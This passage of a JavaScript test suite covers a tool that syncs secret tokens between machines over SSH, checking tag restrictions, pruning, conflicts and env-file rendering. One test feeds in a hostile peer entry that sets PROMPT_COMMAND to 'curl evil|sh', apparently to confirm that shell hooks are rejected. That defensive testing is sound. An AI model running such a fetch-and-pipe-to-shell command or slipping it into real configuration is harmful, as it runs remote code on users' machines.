  assert.equal(store.readSecret(peerHome, 'github'), null, 'the retirement propagates');
});

test('push: a peer that is mid-write is not clobbered', async () => {
  const localHome = scratch();
  const peerHome = path.join(scratch(), 'remote');
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'localbox', tags: [] },
      hosts: { peer: { name: 'peer', ssh: 'peer', tags: [], path: peerHome, mode: 'both', enabled: true } },
    }),
  );
  writeInventory(localHome, [token({ id: 'github' })]);

  const ctx = commands.context(localHome);
  await commands.setToken({ ctx, id: 'github', value: 'v1', verify: false });

  fs.mkdirSync(peerHome, { recursive: true });
  fs.writeFileSync(path.join(peerHome, '.lock'), String(process.pid), { flag: 'wx', mode: 0o600 });

  setSshRunner(fakePeer({ peer: peerHome }).runner);
  after(() => setSshRunner(offlineRunner));

  const result = await commands.pushHost({ ctx, host: ctx.config.hosts.peer });
  assert.equal(result.ok, false);
  assert.match(result.error, /busy/);
  assert.equal(store.readSecret(peerHome, 'github'), null, 'nothing was written over the lock');
});

test('push: a home machine does not delete a work token from the work peer', async () => {
  // The prune list must describe what the *peer* may hold by its own tags, not
  // what this machine happens to have locally. Getting that backwards turned
  // the leak fix into data loss on the first ordinary sync.
  const localHome = scratch();
  const peerHome = path.join(scratch(), 'remote');
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'homebox', tags: ['homelab'] },
      hosts: { workpeer: { name: 'workpeer', ssh: 'workpeer', tags: ['work'], path: peerHome, mode: 'both', enabled: true } },
    }),
  );
  writeInventory(localHome, [token({ id: 'github', onlyOn: ['work'] })]);

  // The work peer legitimately holds the token; this machine holds nothing.
  fs.mkdirSync(path.join(peerHome, 'state'), { recursive: true });
  store.writeSecret(peerHome, 'github', 'WORK_VALUE');
  store.writeMeta(
    peerHome,
    store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 3, value: 'WORK_VALUE', updatedBy: 'workpeer', onlyOn: ['work'] }),
  );

  setSshRunner(fakePeer({ workpeer: peerHome }).runner);
  after(() => setSshRunner(offlineRunner));

  const ctx = commands.context(localHome);
  const result = await commands.pushHost({ ctx, host: ctx.config.hosts.workpeer });
  assert.equal(result.ok, true, result.error);
  assert.equal(store.readSecret(peerHome, 'github'), 'WORK_VALUE', "the work peer's own token survives");
  assert.equal(store.readSecret(localHome, 'github'), null, 'and it is not adopted here');
  // ...and neither does its env: it is rendered from the peer's own state, not
  // from the pushing machine's inventory (which has no row for this token).
  const peerEnv = fs.readFileSync(path.join(peerHome, ENV_FILE), 'utf8');
  assert.ok(peerEnv.includes("export GITHUB_TOKEN='WORK_VALUE'"), 'the peer keeps serving its own token');
});

test('pull: a token with no inventory row is still refused by its own metadata', async () => {
  // inventory.toml is local and never syncs, so a home machine usually has no
  // row for a work token. The restriction has to travel with the token.
  const localHome = scratch();
  const peerHome = path.join(scratch(), 'remote');
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'homebox', tags: ['homelab'] },
      hosts: { workpeer: { name: 'workpeer', ssh: 'workpeer', tags: ['work'], path: peerHome, mode: 'both', enabled: true } },
    }),
  );
  writeInventory(localHome, []); // deliberately no row for github

  fs.mkdirSync(path.join(peerHome, 'state'), { recursive: true });
  store.writeSecret(peerHome, 'github', 'WORK_VALUE');
  store.writeMeta(
    peerHome,
    store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 4, value: 'WORK_VALUE', updatedBy: 'workpeer', onlyOn: ['work'] }),
  );

  setSshRunner(fakePeer({ workpeer: peerHome }).runner);
  after(() => setSshRunner(offlineRunner));

  const ctx = commands.context(localHome);
  const result = await commands.pullHost({ ctx, host: ctx.config.hosts.workpeer });
  assert.deepEqual(result.adopted, []);
  assert.ok(result.rejected.some((entry) => entry.id === 'github'), JSON.stringify(result.rejected));
  assert.equal(store.readSecret(localHome, 'github'), null);
});

test('push: a conflicting id renders the peer value into the peer env, not ours', async () => {
  const localHome = scratch();
  const peerHome = path.join(scratch(), 'remote');
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'localbox', tags: [] },
      hosts: { peer: { name: 'peer', ssh: 'peer', tags: [], path: peerHome, mode: 'both', enabled: true } },
    }),
  );
  writeInventory(localHome, [token({ id: 'github' })]);

  const ctx = commands.context(localHome);
  store.writeSecret(localHome, 'github', 'MINE');
  store.writeMeta(localHome, store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 5, value: 'MINE', updatedBy: 'localbox' }));

  fs.mkdirSync(path.join(peerHome, 'state'), { recursive: true });
  store.writeSecret(peerHome, 'github', 'THEIRS');
  store.writeMeta(peerHome, store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 5, value: 'THEIRS', updatedBy: 'peer' }));

  setSshRunner(fakePeer({ peer: peerHome }).runner);
  after(() => setSshRunner(offlineRunner));

  await commands.pushHost({ ctx, host: ctx.config.hosts.peer });
  const peerEnv = fs.readFileSync(path.join(peerHome, ENV_FILE), 'utf8');
  assert.ok(peerEnv.includes("export GITHUB_TOKEN='THEIRS'"), 'the env must agree with the peer\'s state');
  assert.ok(!peerEnv.includes('MINE'));
});

test('prune: a typo tag drops the local copy, and the peer is the way back', async () => {
  // Archiving on prune would keep the work credential on the home machine,
  // which is exactly what the prune exists to prevent. Recovery for a typo is
  // the peer that legitimately holds the token.
  const localHome = scratch();
  const peerHome = path.join(scratch(), 'remote');
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'localbox', tags: ['wrok'] }, // typo
      hosts: { peer: { name: 'peer', ssh: 'peer', tags: ['work'], path: peerHome, mode: 'both', enabled: true } },
    }),
  );
  writeInventory(localHome, [token({ id: 'github', onlyOn: ['work'] })]);

  const ctx = commands.context(localHome);
  store.writeSecret(localHome, 'github', 'ONLY_COPY');
  store.writeMeta(
    localHome,
    store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 2, value: 'ONLY_COPY', updatedBy: 'localbox', onlyOn: ['work'] }),
  );
  fs.mkdirSync(path.join(peerHome, 'state'), { recursive: true });
  store.writeSecret(peerHome, 'github', 'ONLY_COPY');
  store.writeMeta(
    peerHome,
    store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 2, value: 'ONLY_COPY', updatedBy: 'workbox', onlyOn: ['work'] }),
  );

  setSshRunner(fakePeer({ peer: peerHome }).runner);
  after(() => setSshRunner(offlineRunner));

  const result = await commands.pullHost({ ctx, host: ctx.config.hosts.peer });
  assert.ok(result.pruned.includes('github'));
  assert.equal(store.readSecret(localHome, 'github'), null);
  assert.equal(store.readArchive(localHome, 'github'), null, 'a pruned work token must not linger in archive/');
  assert.equal(store.readSecret(peerHome, 'github'), 'ONLY_COPY', 'the peer still holds it');

  // Fix the tag and pull it back.
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'localbox', tags: ['work'] },
      hosts: { peer: { name: 'peer', ssh: 'peer', tags: ['work'], path: peerHome, mode: 'both', enabled: true } },
    }),
  );
  const fixed = commands.context(localHome);
  const restored = await commands.pullHost({ ctx: fixed, host: fixed.config.hosts.peer });
  assert.deepEqual(restored.adopted, ['github']);
  assert.equal(store.readSecret(localHome, 'github'), 'ONLY_COPY');
});

test('take: still honours tags and the hash, and archives what it replaces', async () => {
  const localHome = scratch();
  const peerHome = path.join(scratch(), 'remote');
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'homebox', tags: ['homelab'] },
      hosts: { peer: { name: 'peer', ssh: 'peer', tags: ['work'], path: peerHome, mode: 'both', enabled: true } },
    }),
  );
  writeInventory(localHome, [token({ id: 'github', onlyOn: ['work'] })]);

  fs.mkdirSync(path.join(peerHome, 'state'), { recursive: true });
  store.writeSecret(peerHome, 'github', 'WORK_VALUE');
  store.writeMeta(
    peerHome,
    store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 9, value: 'WORK_VALUE', updatedBy: 'peer', onlyOn: ['work'] }),
  );

  setSshRunner(fakePeer({ peer: peerHome }).runner);
  after(() => setSshRunner(offlineRunner));

  const ctx = commands.context(localHome);
  const blocked = await commands.takeFrom({ ctx, host: ctx.config.hosts.peer, id: 'github' });
  assert.equal(blocked.ok, false);
  assert.match(blocked.error, /not tagged/);

  // With matching tags it works, and the value it displaces is recoverable.
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'localbox2', tags: ['work'] },
      hosts: { peer: { name: 'peer', ssh: 'peer', tags: ['work'], path: peerHome, mode: 'both', enabled: true } },
    }),
  );
  const work = commands.context(localHome);
  store.writeSecret(localHome, 'github', 'OLD_LOCAL');
  store.writeMeta(localHome, store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 1, value: 'OLD_LOCAL', updatedBy: 'local' }));
  const taken = await commands.takeFrom({ ctx: work, host: work.config.hosts.peer, id: 'github' });
  assert.equal(taken.ok, true, taken.error);
  assert.equal(store.readSecret(localHome, 'github'), 'WORK_VALUE');
  assert.equal(store.readArchive(localHome, 'github'), 'OLD_LOCAL');
});

test('set: rotating on a machine with no inventory row keeps the restriction', async () => {
  // A row-less machine (any second machine, since the inventory never syncs)
  // used to write only_on: [] and thereby leak the token everywhere.
  const localHome = scratch();
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({ self: { name: 'workbox', tags: ['work'] }, hosts: {} }),
  );
  writeInventory(localHome, []); // no row for github
  ensureHome(localHome);
  fs.mkdirSync(path.join(localHome, 'archive'), { recursive: true });

  store.writeSecret(localHome, 'github', 'v1');
  store.writeMeta(
    localHome,
    store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 1, value: 'v1', updatedBy: 'workbox', onlyOn: ['work'] }),
  );

  const ctx = commands.context(localHome);
  const rotated = await commands.setToken({ ctx, id: 'github', value: 'v2', verify: false });
  assert.equal(rotated.ok, true, rotated.error);
  assert.deepEqual(store.readMetas(localHome).get('github').only_on, ['work'], 'the restriction must not be widened');
  assert.equal(commands.tokenAllowedOn(undefined, ['homelab'], ['work']), false);
});

test('render: a peer cannot choose the variable name, and names never collide', () => {
  const home = scratch();
  writeFileAtomic(path.join(home, 'config.toml'), renderConfig({ self: { name: 'workbox', tags: ['work'] }, hosts: {} }));
  writeInventory(home, [token({ id: 'zz', var: 'ZZ_TOKEN' })]);
  ensureHome(home);

  // A peer-supplied identifier is still an identifier: PROMPT_COMMAND would run
  // in every shell on this machine.
  store.writeSecret(home, 'zz', 'value');
  fs.writeFileSync(
    store.metaPath(home, 'zz'),
    `${JSON.stringify({ id: 'zz', var: 'PROMPT_COMMAND', version: 2, sha: store.sha256('value'), only_on: [], removed: false })}\n`,
    { mode: 0o600 },
  );

  const ctx = commands.context(home);
  const rendered = store.renderEnv({ home, inventory: ctx.inventory, metas: store.readMetas(home), tags: ctx.tags, hostName: 'workbox' });
  assert.ok(!rendered.text.includes('PROMPT_COMMAND'), 'the registry name wins');
  assert.ok(rendered.text.includes("export ZZ_TOKEN='value'"));

  // Two ids claiming one variable: one line, and the loser is reported.
  writeInventory(home, [token({ id: 'zz', var: 'SHARED_TOKEN' }), token({ id: 'aa', var: 'SHARED_TOKEN' })]);
  store.writeSecret(home, 'aa', 'other');
  store.writeMeta(home, store.makeMeta({ id: 'aa', varName: 'SHARED_TOKEN', version: 1, value: 'other', updatedBy: 'workbox' }));
  const again = commands.context(home);
  const clash = store.renderEnv({ home, inventory: again.inventory, metas: store.readMetas(home), tags: again.tags, hostName: 'workbox' });
  assert.equal(clash.included.filter((id) => id === 'aa' || id === 'zz').length, 1);
  assert.ok(clash.skipped.some((entry) => /already used/.test(entry.reason)), JSON.stringify(clash.skipped));
});

test('push: a peer-only token is never judged by the pusher\'s idea of the peer tags', async () => {
  // A stale or wrong [hosts.x] tags entry on this machine must not destroy the
  // peer's only copy of a token this machine never held.
  const localHome = scratch();
  const peerHome = path.join(scratch(), 'remote');
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'homebox', tags: ['homelab'] },
      hosts: { workpeer: { name: 'workpeer', ssh: 'workpeer', tags: ['Work'], path: peerHome, mode: 'both', enabled: true } },
    }),
  );
  writeInventory(localHome, []);

  fs.mkdirSync(path.join(peerHome, 'state'), { recursive: true });
  store.writeSecret(peerHome, 'ghe', 'WORK_ONLY');
  store.writeMeta(
    peerHome,
    store.makeMeta({ id: 'ghe', varName: 'GHE_TOKEN', version: 2, value: 'WORK_ONLY', updatedBy: 'workbox', onlyOn: ['work'] }),
  );

  setSshRunner(fakePeer({ workpeer: peerHome }).runner);
  after(() => setSshRunner(offlineRunner));

  const ctx = commands.context(localHome);
  const result = await commands.pushHost({ ctx, host: ctx.config.hosts.workpeer });
  assert.equal(result.ok, true, result.error);
  assert.equal(store.readSecret(peerHome, 'ghe'), 'WORK_ONLY', "the peer's own token survives a wrong tag entry");
});

test('prune: the archive copy goes too, so --previous cannot resurrect it', async () => {
  const localHome = scratch();
  const peerHome = path.join(scratch(), 'remote');
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'homebox', tags: ['homelab'] },
      hosts: { peer: { name: 'peer', ssh: 'peer', tags: ['work'], path: peerHome, mode: 'both', enabled: true } },
    }),
  );
  writeInventory(localHome, [token({ id: 'ghe', onlyOn: ['work'] })]);
  ensureHome(localHome);

  // A work value this machine once held, plus the archive a rotation left.
  store.writeSecret(localHome, 'ghe', 'WORK_OLD');
  store.writeMeta(localHome, store.makeMeta({ id: 'ghe', varName: 'GHE_TOKEN', version: 2, value: 'WORK_OLD', updatedBy: 'x', onlyOn: ['work'] }));
  store.writeArchive(localHome, 'ghe', 'WORK_OLDER');

  // A prune is only permitted when the value survives elsewhere, so the peer
  // holds the same value here.
  fs.mkdirSync(path.join(peerHome, 'state'), { recursive: true });
  store.writeSecret(peerHome, 'ghe', 'WORK_OLD');
  store.writeMeta(peerHome, store.makeMeta({ id: 'ghe', varName: 'GHE_TOKEN', version: 2, value: 'WORK_OLD', updatedBy: 'workbox', onlyOn: ['work'] }));
  setSshRunner(fakePeer({ peer: peerHome }).runner);
  after(() => setSshRunner(offlineRunner));

  const ctx = commands.context(localHome);
  const result = await commands.pullHost({ ctx, host: ctx.config.hosts.peer });
  assert.equal(result.ok, true, result.error);
  assert.ok(result.pruned.includes('ghe'));
  assert.equal(store.readSecret(localHome, 'ghe'), null);
  assert.equal(store.readArchive(localHome, 'ghe'), null, 'the archive copy is a copy of the credential');
  assert.equal(commands.getToken({ ctx: commands.context(localHome), id: 'ghe', previous: true }).ok, false);
});

test('push: editing only_on in the registry reaches the metadata', async () => {
  const localHome = scratch();
  const peerHome = path.join(scratch(), 'remote');
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'workbox', tags: ['work'] },
      hosts: { home: { name: 'home', ssh: 'home', tags: ['homelab'], path: peerHome, mode: 'both', enabled: true } },
    }),
  );
  const ctx = commands.context(localHome);
  await commands.setToken({ ctx, id: 'ghe', value: 'V1', verify: false });
  assert.deepEqual(store.readMetas(localHome).get('ghe').only_on, [], 'set before any tagging');
  setSshRunner(fakePeer({ home: peerHome }).runner);
  after(() => setSshRunner(offlineRunner));

  // Later the row is tagged (this is the documented import-then-tag flow).
  const inventoryFile = path.join(localHome, 'inventory.toml');
  fs.writeFileSync(
    inventoryFile,
    fs.readFileSync(inventoryFile, 'utf8').replace('how       = ', 'only_on   = ["work"]\nhow       = '),
  );
  const tagged = commands.context(localHome);
  assert.deepEqual(commands.context(localHome).inventory.byId.get('ghe').onlyOn, ['work']);

  // Before the fix this pushed an unrestricted metadata and the home peer kept it.
  await commands.pushHost({ ctx: tagged, host: tagged.config.hosts.home });
  assert.equal(store.readSecret(peerHome, 'ghe'), null, 'a newly tagged work token is held back');
});

test('set: refuses to store a value this machine would immediately prune', async () => {
  // "Rotate on any host" was wrong advice: on a host the tags exclude, the next
  // sync deletes the new value, meta and archive — the fresh credential would
  // exist nowhere.
  const localHome = scratch();
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({ self: { name: 'laptop', tags: ['home'] }, hosts: {} }),
  );
  writeInventory(localHome, [token({ id: 'github', onlyOn: ['work'] })]);

  const ctx = commands.context(localHome);
  const result = await commands.setToken({ ctx, id: 'github', value: 'FRESH', verify: false });
  assert.equal(result.ok, false);
  assert.match(result.error, /restricted to hosts tagged work/);
  assert.equal(store.readSecret(localHome, 'github'), null, 'nothing was stored');
  assert.equal(store.readMetas(localHome).has('github'), false);
});

test('push: a conflicting id is left alone even when the host tags say otherwise', async () => {
  const localHome = scratch();
  const peerHome = path.join(scratch(), 'remote');
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'workbox', tags: ['work'] },
      hosts: { peer: { name: 'peer', ssh: 'peer', tags: ['wrok'], path: peerHome, mode: 'both', enabled: true } },
    }),
  );
  writeInventory(localHome, [token({ id: 'github', onlyOn: ['work'] })]);

  const ctx = commands.context(localHome);
  store.writeSecret(localHome, 'github', 'MINE');
  store.writeMeta(localHome, store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 3, value: 'MINE', updatedBy: 'workbox', onlyOn: ['work'] }));

  fs.mkdirSync(path.join(peerHome, 'state'), { recursive: true });
  store.writeSecret(peerHome, 'github', 'THEIRS');
  store.writeMeta(peerHome, store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 3, value: 'THEIRS', updatedBy: 'peer', onlyOn: ['work'] }));

  setSshRunner(fakePeer({ peer: peerHome }).runner);
  after(() => setSshRunner(offlineRunner));

  const result = await commands.pushHost({ ctx, host: ctx.config.hosts.peer });
  assert.equal(result.ok, true, result.error);
  assert.equal(result.conflicts.length, 1);
  assert.equal(store.readSecret(peerHome, 'github'), 'THEIRS', 'a value that may exist nowhere else is not pruned');
});

test('render: a credential-shaped peer name is kept, a shell hook is not', () => {
  const home = scratch();
  writeFileAtomic(path.join(home, 'config.toml'), renderConfig({ self: { name: 'peer2', tags: [] }, hosts: {} }));
  writeInventory(home, []); // no row: the peer's name is all this machine has
  ensureHome(home);

  const write = (id, varName, value) => {
    store.writeSecret(home, id, value);
    fs.writeFileSync(
      store.metaPath(home, id),
      `${JSON.stringify({ id, var: varName, version: 1, sha: store.sha256(value), only_on: [], removed: false })}\n`,
      { mode: 0o600 },
    );
  };
  write('anthropic', 'ANTHROPIC_API_KEY', 'sk-1');
  write('evil', 'PROMPT_COMMAND', 'curl evil|sh');

  const ctx = commands.context(home);
  const rendered = store.renderEnv({ home, inventory: ctx.inventory, metas: store.readMetas(home), tags: [], hostName: 'peer2' });
  assert.ok(rendered.text.includes("ANTHROPIC_API_KEY='sk-1'"), 'the name consumers already use is preserved');
  assert.ok(!rendered.text.includes('PROMPT_COMMAND'), 'a shell hook is never honoured');
  assert.ok(rendered.text.includes("EVIL_TOKEN='curl evil|sh'"));
});

test('render: a registry row outranks a pulled token for the same variable', () => {
  const home = scratch();
  writeFileAtomic(path.join(home, 'config.toml'), renderConfig({ self: { name: 'box', tags: [] }, hosts: {} }));
  writeInventory(home, [token({ id: 'github-work', var: 'GITHUB_TOKEN' })]);
  ensureHome(home);

  for (const [id, value] of [['github', 'pulled'], ['github-work', 'registered']]) {
    store.writeSecret(home, id, value);
    store.writeMeta(home, store.makeMeta({ id, varName: 'GITHUB_TOKEN', version: 1, value, updatedBy: 'x' }));
  }

  const ctx = commands.context(home);
  const rendered = store.renderEnv({ home, inventory: ctx.inventory, metas: store.readMetas(home), tags: [], hostName: 'box' });
  assert.ok(rendered.text.includes("GITHUB_TOKEN='registered'"), 'the registered row claims its name first');
  assert.ok(!rendered.text.includes('pulled'));
  assert.ok(rendered.skipped.some((entry) => /already used/.test(entry.reason)));
});

test('set: a peer-supplied restriction also blocks the rotation', async () => {
  // The restriction can arrive from a peer that was consulted after the first
  // gate ran. Writing then would be undone by the next sync's prune.
  const localHome = scratch();
  const peerHome = path.join(scratch(), 'remote');
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'laptop', tags: ['home'] },
      hosts: { work: { name: 'work', ssh: 'work', tags: ['work'], path: peerHome, mode: 'both', enabled: true } },
    }),
  );
  writeInventory(localHome, []); // no row, no local meta: only the peer knows

  fs.mkdirSync(path.join(peerHome, 'state'), { recursive: true });
  store.writeSecret(peerHome, 'github', 'WORK_V3');
  store.writeMeta(
    peerHome,
    store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 3, value: 'WORK_V3', updatedBy: 'work', onlyOn: ['work'] }),
  );

  setSshRunner(fakePeer({ work: peerHome }).runner);
  after(() => setSshRunner(offlineRunner));

  const ctx = commands.context(localHome);
  const result = await commands.setToken({ ctx, id: 'github', value: 'FRESH', verify: false });
  assert.equal(result.ok, false);
  assert.match(result.error, /belongs to hosts tagged work/);
  assert.equal(store.readMetas(localHome).has('github'), false);
  assert.equal(store.readSecret(localHome, 'github'), null);
});

test('prune: the only copy on the only tagged machine is kept, not destroyed', async () => {
  // A tag typo on the sole holder used to delete the value, meta and archive,
  // leaving the credential nowhere. Keeping it unrendered costs nothing.
  const localHome = scratch();
  const peerHome = path.join(scratch(), 'remote');
  writeFileAtomic(
    path.join(localHome, 'config.toml'),
    renderConfig({
      self: { name: 'workbox', tags: ['wrok'] }, // typo
      hosts: { peer: { name: 'peer', ssh: 'peer', tags: ['homelab'], path: peerHome, mode: 'both', enabled: true } },
    }),
  );
  writeInventory(localHome, [token({ id: 'github', onlyOn: ['work'] })]);
  store.writeSecret(localHome, 'github', 'ONLY_COPY');
  store.writeMeta(localHome, store.makeMeta({ id: 'github', varName: 'GITHUB_TOKEN', version: 2, value: 'ONLY_COPY', updatedBy: 'workbox', onlyOn: ['work'] }));

  fs.mkdirSync(peerHome, { recursive: true }); // the peer has nothing
  setSshRunner(fakePeer({ peer: peerHome }).runner);
  after(() => setSshRunner(offlineRunner));

  const ctx = commands.context(localHome);
  const result = await commands.pullHost({ ctx, host: ctx.config.hosts.peer });
  assert.equal(result.ok, true, result.error);
  assert.deepEqual(result.pruned, []);
  assert.ok(result.kept.some((entry) => entry.id === 'github'), JSON.stringify(result.kept));
  assert.equal(store.readSecret(localHome, 'github'), 'ONLY_COPY', 'the sole copy survives a typo');

  // ...and it is not rendered anywhere, so keeping it leaks nothing into shells.
  const env = fs.readFileSync(path.join(localHome, ENV_FILE), 'utf8');
  assert.ok(!env.includes('ONLY_COPY'));
});

test('render: a peer env is tag-filtered for everything it is not receiving', () => {
  const home = scratch();
  writeFileAtomic(path.join(home, 'config.toml'), renderConfig({ self: { name: 'home', tags: ['home'] }, hosts: {} }));
  writeInventory(home, []);
  ensureHome(home);

  // A conflicting work token that happens to sit on this peer: the push leaves
  // it alone, and its env must not export it to a home-tagged machine either.
  store.writeSecret(home, 'w', 'THEIRS');
  store.writeMeta(home, store.makeMeta({ id: 'w', varName: 'W_TOKEN', version: 3, value: 'THEIRS', updatedBy: 'x', onlyOn: ['work'] }));

  const ctx = commands.context(home);
  const filtered = store.renderEnv({ home, inventory: ctx.inventory, metas: store.readMetas(home), tags: ctx.tags, hostName: 'home', config: { ...ctx.config, ignoreTags: new Set() } });
  assert.ok(!filtered.text.includes('W_TOKEN'), 'not tagged for home, not rendered');

  const sent = store.renderEnv({ home, inventory: ctx.inventory, metas: store.readMetas(home), tags: ctx.tags, hostName: 'home', config: { ...ctx.config, ignoreTags: new Set(['w']) } });
  assert.ok(sent.text.includes('W_TOKEN'), 'but an id we are sending is rendered for the peer');
});
